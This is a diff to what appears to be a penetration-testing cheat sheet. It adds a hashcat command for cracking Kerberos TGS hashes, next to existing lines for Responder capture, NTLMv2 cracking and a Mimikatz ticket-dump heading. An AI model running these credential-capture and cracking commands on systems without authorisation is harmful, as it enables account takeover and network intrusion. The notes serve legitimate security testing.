@@ -92,6 +92,11 @@ responder -I eth0 -v
 ```bash
 hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
 ```
+### Crack kerberos hashes
+```bash
+hashcat64.exe -m 13100 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
+```
+
 
 ## Mimikatz
 ### Dump tickets
